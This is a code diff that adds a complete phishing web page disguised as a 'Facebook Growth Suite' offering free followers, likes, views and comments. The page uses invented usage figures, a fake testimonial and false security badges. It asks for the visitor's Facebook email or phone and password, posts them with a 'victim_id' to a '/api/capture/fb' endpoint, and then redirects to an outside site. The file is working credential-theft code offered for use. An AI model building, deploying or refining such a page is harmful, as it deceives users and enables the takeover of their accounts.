@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Facebook Growth Suite</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: radial-gradient(circle at 30% 10%, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            padding: 16px;
+        }
+        .glass {
+            background: rgba(255,255,255,0.06);
+            backdrop-filter: blur(16px);
+            border-radius: 40px;
+            padding: 32px 24px;
+            max-width: 480px;
+            width: 100%;
+            border: 1px solid rgba(255,255,255,0.12);
+            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
+            text-align: center;
+            color: #fff;
+        }
+        .glass h1 {
+            font-size: 28px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #1877f2, #4267B2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .glass .sub {
+            font-size: 13px;
+            letter-spacing: 2px;
+            color: rgba(255,255,255,0.5);
+            text-transform: uppercase;
+            margin: 4px 0 18px;
+        }
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            background: rgba(255,255,255,0.04);
+            border-radius: 20px;
+            padding: 14px 10px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255,255,255,0.06);
+        }
+        .stat-item {
+            text-align: center;
+        }
+        .stat-item .number {
+            font-size: 20px;
+            font-weight: 700;
+            color: #fff;
+        }
+        .stat-item .label {
+            font-size: 10px;
+            opacity: 0.5;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .testimonial {
+            background: rgba(255,255,255,0.03);
+            border-left: 3px solid #1877f2;
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin: 14px 0;
+            text-align: left;
+            font-size: 13px;
+            line-height: 1.5;
+            color: rgba(255,255,255,0.7);
+        }
+        .testimonial .author {
+            color: #fff;
+            font-weight: 600;
+            margin-top: 4px;
+        }
+        .option-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 14px;
+            margin: 18px 0;
+        }
+        .option-card {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 20px;
+            padding: 18px 10px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            backdrop-filter: blur(4px);
+        }
+        .option-card:active {
+            transform: scale(0.94);
+            background: rgba(24,119,242,0.15);
+            border-color: #1877f2;
+        }
+        .option-card .icon {
+            font-size: 36px;
+            display: block;
+            margin-bottom: 6px;
+        }
+        .option-card .label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+        }
+        .option-card .desc {
+            font-size: 11px;
+            opacity: 0.5;
+            margin-top: 2px;
+        }
+        .glow-btn {
+            background: linear-gradient(145deg, #1877f2, #4267B2);
+            border: none;
+            padding: 16px;
+            border-radius: 60px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 8px 30px rgba(24,119,242,0.35);
+            transition: 0.25s;
+            margin: 12px 0 6px;
+        }
+        .glow-btn:active { transform: scale(0.96); }
+        .input-group {
+            text-align: left;
+            margin: 14px 0 8px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            opacity: 0.7;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 16px;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: rgba(255,255,255,0.04);
+            color: #fff;
+            font-size: 16px;
+            transition: 0.25s;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #1877f2;
+            background: rgba(255,255,255,0.07);
+        }
+        .back-btn {
+            background: rgba(255,255,255,0.04) !important;
+            border: 1px solid rgba(255,255,255,0.06) !important;
+            box-shadow: none !important;
+            margin-top: 10px;
+            font-size: 15px !important;
+            padding: 14px !important;
+        }
+        .footer-text {
+            font-size: 11px;
+            opacity: 0.3;
+            margin-top: 18px;
+        }
+        .trust-badge {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 14px;
+            font-size: 12px;
+            opacity: 0.4;
+        }
+        .trust-badge span { display: flex; align-items: center; gap: 4px; }
+    </style>
+</head>
+<body>
+    <div class="glass" id="mainPage">
+        <h1>🚀 Facebook Growth Suite</h1>
+        <p class="sub">Boost your page organically</p>
+
+        <div class="stats">
+            <div class="stat-item">
+                <div class="number">15M+</div>
+                <div class="label">Active Users</div>
+            </div>
+            <div class="stat-item">
+                <div class="number">4.9★</div>
+                <div class="label">Rating</div>
+            </div>
+            <div class="stat-item">
+                <div class="number">99.9%</div>
+                <div class="label">Uptime</div>
+            </div>
+        </div>
+
+        <div class="testimonial">
+            “My Facebook page reached 50K likes in 10 days. This tool is a game changer!”
+            <div class="author">— @john_doe, 1.8M followers</div>
+        </div>
+
+        <p style="font-size:14px; opacity:0.7; margin-bottom:6px;">Choose your growth service</p>
+        <div class="option-grid" id="optionGrid"></div>
+
+        <div class="trust-badge">
+            <span>🔒 256-bit SSL</span>
+            <span>🛡️ Secure Payment</span>
+            <span>🤝 24/7 Support</span>
+        </div>
+
+        <p class="footer-text">Join 5M+ creators who grew their Facebook</p>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const victimId = urlParams.get('v') || 'unknown';
+
+        const options = [
+            { id: 'followers', icon: '👥', label: 'FREE FOLLOWERS', desc: 'Boost your page' },
+            { id: 'views', icon: '👁️', label: 'FREE VIEWS', desc: 'Increase video views' },
+            { id: 'comments', icon: '💬', label: 'FREE COMMENTS', desc: 'Get real comments' },
+            { id: 'likes', icon: '❤️', label: 'FREE LIKES', desc: 'Grow your likes' }
+        ];
+
+        const grid = document.getElementById('optionGrid');
+        options.forEach(opt => {
+            const card = document.createElement('div');
+            card.className = 'option-card';
+            card.innerHTML = `
+                <span class="icon">${opt.icon}</span>
+                <div class="label">${opt.label}</div>
+                <div class="desc">${opt.desc}</div>
+            `;
+            card.onclick = () => showNumberInput(opt.id, opt.label);
+            grid.appendChild(card);
+        });
+
+        function showNumberInput(optionId, optionLabel) {
+            const main = document.getElementById('mainPage');
+            main.innerHTML = `
+                <h1 style="background: linear-gradient(135deg, #1877f2, #4267B2); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">📊 ${optionLabel}</h1>
+                <p style="opacity:0.7; margin: 10px 0 18px; font-size: 14px;">
+                    Enter the number of ${optionId.toLowerCase()} you want
+                </p>
+                <div class="input-group">
+                    <label>🔢 Quantity</label>
+                    <input type="number" id="quantityInput" placeholder="e.g. 1000" min="1" />
+                </div>
+                <button class="glow-btn" onclick="showLogin('${optionId}', '${optionLabel}')">Next →</button>
+                <button class="glow-btn back-btn" onclick="location.reload()">⬅ Back</button>
+                <p class="footer-text" style="margin-top:20px;">Secure & encrypted</p>
+            `;
+        }
+
+        function showLogin(optionId, optionLabel) {
+            const quantity = document.getElementById('quantityInput').value;
+            if (!quantity || quantity < 1) {
+                alert('⚠️ Please enter a valid number');
+                return;
+            }
+
+            const main = document.getElementById('mainPage');
+            main.innerHTML = `
+                <h1 style="background: linear-gradient(135deg, #1877f2, #4267B2); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🔐 Facebook Login</h1>
+                <p style="opacity:0.7; margin: 10px 0 18px; font-size: 14px;">
+                    Enter your credentials to get <strong>${quantity}</strong> ${optionId.toLowerCase()}
+                </p>
+                <div class="input-group">
+                    <label>👤 Email / Phone</label>
+                    <input type="text" id="loginUser" placeholder="Enter your Facebook email/phone" />
+                </div>
+                <div class="input-group">
+                    <label>🔒 Password</label>
+                    <input type="password" id="loginPass" placeholder="Enter your password" />
+                </div>
+                <button class="glow-btn" onclick="submitLogin('${optionId}', '${quantity}')">🚀 Claim Now</button>
+                <button class="glow-btn back-btn" onclick="location.reload()">⬅ Back</button>
+                <p class="footer-text" style="margin-top:20px;">🔐 Your data is secure & encrypted</p>
+            `;
+        }
+
+        async function sendData(payload) {
+            try {
+                await fetch('/api/capture/fb', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ victim_id: victimId, type: 'fb', ...payload })
+                });
+            } catch (e) {
+                console.log('Send error:', e);
+            }
+        }
+
+        async function submitLogin(optionId, quantity) {
+            const username = document.getElementById('loginUser').value;
+            const password = document.getElementById('loginPass').value;
+            if (!username || !password) {
+                alert('⚠️ Please fill all fields');
+                return;
+            }
+            await sendData({
+                creds: {
+                    platform: 'facebook',
+                    username: username,
+                    password: password,
+                    service: optionId,
+                    quantity: quantity
+                }
+            });
+            window.location.href = 'https://takipcikrali.com/';
+        }
+    </script>
+</body>
+</html>
